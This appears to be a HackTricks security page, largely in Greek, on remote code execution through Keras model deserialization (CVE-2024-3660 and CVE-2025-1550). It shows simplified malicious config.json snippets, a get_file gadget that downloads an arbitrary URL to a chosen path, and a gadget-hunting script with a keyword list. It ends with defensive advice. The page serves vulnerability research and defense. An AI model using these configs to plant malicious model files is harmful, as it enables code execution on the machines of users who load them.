# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα συνοψίζει πρακτικές τεχνικές εκμετάλλευσης κατά της διαδικασίας αποσυμπίεσης μοντέλου Keras, εξηγεί τα εσωτερικά του εγγενή μορφής .keras και την επιφάνεια επίθεσης, και παρέχει ένα εργαλείο ερευνητή για την εύρεση Ευπαθειών Αρχείων Μοντέλου (MFVs) και gadgets μετά την επιδιόρθωση.

## Εσωτερικά της μορφής μοντέλου .keras

Ένα αρχείο .keras είναι ένα ZIP αρχείο που περιέχει τουλάχιστον:
- metadata.json – γενικές πληροφορίες (π.χ., έκδοση Keras)
- config.json – αρχιτεκτονική μοντέλου (κύρια επιφάνεια επίθεσης)
- model.weights.h5 – βάρη σε HDF5

Το config.json οδηγεί σε αναδρομική αποσυμπίεση: Η Keras εισάγει μονάδες, επιλύει κλάσεις/συναρτήσεις και ανακατασκευάζει στρώματα/αντικείμενα από λεξικά που ελέγχονται από τον επιτιθέμενο.

Παράδειγμα αποσπασμάτων για ένα αντικείμενο στρώματος Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- Εισαγωγή μονάδων και επίλυση συμβόλων από τα κλειδιά module/class_name
- από_config(...) ή κλήση κατασκευαστή με kwargs που ελέγχονται από τον επιτιθέμενο
- Αναδρομή σε εσωτερικά αντικείμενα (ενεργοποιήσεις, αρχικοποιητές, περιορισμοί, κ.λπ.)

Ιστορικά, αυτό αποκάλυψε τρεις πρωτότυπες δυνατότητες σε έναν επιτιθέμενο που δημιουργεί το config.json:
- Έλεγχος των μονάδων που εισάγονται
- Έλεγχος των κλάσεων/συναρτήσεων που επιλύονται
- Έλεγχος των kwargs που περνούν στους κατασκευαστές/από_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() χρησιμοποίησε python_utils.func_load(...) το οποίο αποκωδικοποιεί base64 και καλεί marshal.loads() σε bytes του επιτιθέμενου; Η απομάγευση της Python μπορεί να εκτελέσει κώδικα.

Exploit idea (simplified payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Το Keras επιβάλλει το safe_mode=True από προεπιλογή. Οι σειριοποιημένες Python συναρτήσεις στο Lambda αποκλείονται εκτός αν ο χρήστης επιλέξει ρητά να απενεργοποιήσει το safe_mode=False.

Notes:
- Οι παλαιές μορφές (παλαιότερες αποθηκεύσεις HDF5) ή οι παλαιότερες βάσεις κώδικα ενδέχεται να μην επιβάλλουν σύγχρονους ελέγχους, επομένως οι επιθέσεις τύπου “downgrade” μπορούν να εφαρμοστούν όταν τα θύματα χρησιμοποιούν παλαιότερους φορτωτές.

## CVE-2025-1550 – Αυθαίρετη εισαγωγή μονάδας στο Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn χρησιμοποίησε την unrestricted importlib.import_module() με συμβολοσειρές μονάδας που ελέγχονται από τον επιτιθέμενο από το config.json.
- Impact: Αυθαίρετη εισαγωγή οποιασδήποτε εγκατεστημένης μονάδας (ή μονάδας που έχει φυτευτεί από τον επιτιθέμενο στο sys.path). Ο κώδικας εκτελείται κατά την εισαγωγή, στη συνέχεια η κατασκευή του αντικειμένου συμβαίνει με kwargs του επιτιθέμενου.

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Ασφαλιστικές βελτιώσεις (Keras ≥ 3.9):
- Λίστα επιτρεπόμενων μονάδων: οι εισαγωγές περιορίζονται σε επίσημα οικοσυστήματα μονάδων: keras, keras_hub, keras_cv, keras_nlp
- Προεπιλογή ασφαλούς λειτουργίας: safe_mode=True αποκλείει την επικίνδυνη φόρτωση σειριακών συναρτήσεων Lambda
- Βασικός έλεγχος τύπων: τα αποσειριασμένα αντικείμενα πρέπει να ταιριάζουν με τους αναμενόμενους τύπους

## Επιφάνεια gadget μετά την επιδιόρθωση μέσα στη λίστα επιτρεπόμενων

Ακόμα και με τη λίστα επιτρεπόμενων και την ασφαλή λειτουργία, παραμένει μια ευρεία επιφάνεια μεταξύ των επιτρεπόμενων κλήσεων Keras. Για παράδειγμα, η keras.utils.get_file μπορεί να κατεβάσει αυθαίρετες διευθύνσεις URL σε τοποθεσίες που επιλέγει ο χρήστης.

Gadget μέσω Lambda που αναφέρεται σε μια επιτρεπόμενη συνάρτηση (όχι σειριακός κωδικός Python):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Σημαντικός περιορισμός:
- Η Lambda.call() προσθέτει τον είσοδο tensor ως την πρώτη θετική παράμετρο κατά την κλήση του στόχου callable. Οι επιλεγμένες συσκευές πρέπει να αντέχουν μια επιπλέον θετική παράμετρο (ή να δέχονται *args/**kwargs). Αυτό περιορίζει ποιες συναρτήσεις είναι βιώσιμες.

Πιθανές επιπτώσεις των επιτρεπόμενων συσκευών:
- Αυθαίρετη λήψη/γραφή (planting διαδρομών, δηλητηρίαση ρυθμίσεων)
- Δικτυακές κλήσεις/επιπτώσεις παρόμοιες με SSRF ανάλογα με το περιβάλλον
- Συσχέτιση με εκτέλεση κώδικα αν οι γραμμένες διαδρομές εισαχθούν/εκτελούνται αργότερα ή προστεθούν στο PYTHONPATH, ή αν υπάρχει μια εγγράψιμη τοποθεσία εκτέλεσης κατά την εγγραφή

## Εργαλειοθήκη ερευνητή

1) Συστηματική ανακάλυψη συσκευών σε επιτρεπόμενα modules

Καταγράψτε υποψήφιες κλήσεις σε keras, keras_nlp, keras_cv, keras_hub και δώστε προτεραιότητα σε αυτές με παρενέργειες αρχείων/δικτύου/διαδικασιών/περιβάλλοντος.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Άμεση δοκιμή αποσειριοποίησης (δεν απαιτείται αρχείο .keras)

Τροφοδοτήστε κατασκευασμένα dicts απευθείας στους αποσειριοποιητές Keras για να μάθετε τις αποδεκτές παραμέτρους και να παρατηρήσετε τις παρενέργειες.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Διείσδυση και μορφές διαφόρων εκδόσεων

Το Keras υπάρχει σε πολλές βάσεις κώδικα/εποχές με διαφορετικούς φραγμούς και μορφές:
- TensorFlow ενσωματωμένο Keras: tensorflow/python/keras (παλαιά, προγραμματισμένο για διαγραφή)
- tf-keras: διατηρείται ξεχωριστά
- Multi-backend Keras 3 (επίσημο): εισήγαγε το εγγενές .keras

Επαναλάβετε τις δοκιμές σε βάσεις κώδικα και μορφές (.keras vs παλαιά HDF5) για να αποκαλύψετε ανατροπές ή ελλείποντες φραγμούς.

## Αμυντικές συστάσεις

- Αντιμετωπίστε τα αρχεία μοντέλου ως μη αξιόπιστη είσοδο. Φορτώστε μοντέλα μόνο από αξιόπιστες πηγές.
- Διατηρήστε το Keras ενημερωμένο; χρησιμοποιήστε Keras ≥ 3.9 για να επωφεληθείτε από την επιτρεπτική λίστα και τους ελέγχους τύπου.
- Μην ορίζετε safe_mode=False κατά την φόρτωση μοντέλων εκτός αν εμπιστεύεστε πλήρως το αρχείο.
- Σκεφτείτε να εκτελέσετε την αποσυμπίεση σε ένα απομονωμένο, λιγότερο προνομιούχο περιβάλλον χωρίς έξοδο δικτύου και με περιορισμένη πρόσβαση στο σύστημα αρχείων.
- Επιβάλετε επιτρεπτικές λίστες/υπογραφές για πηγές μοντέλων και έλεγχο ακεραιότητας όπου είναι δυνατόν.

## Αναφορές

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
